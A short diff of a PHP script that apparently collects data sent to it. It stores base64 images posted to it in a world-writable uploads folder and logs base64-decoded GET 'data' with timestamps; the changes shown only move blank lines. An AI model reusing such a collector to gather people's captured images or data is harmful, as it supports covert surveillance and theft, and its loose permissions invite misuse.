@@ -1,5 +1,4 @@
 <?php
-
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     if (!file_exists('uploads')) {
         mkdir('uploads', 0777, true);
@@ -12,9 +11,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
     file_put_contents($filename, $image_base64);
 }
-
 $data = '';
 $timestamp = date('Y-m-d H:i:s') . " -> ";
+
 if (isset($_GET['data'])) {
     $decoded = base64_decode($_GET['data']);
     $data .= "\n". $timestamp . "GET: " . $decoded . "\n";
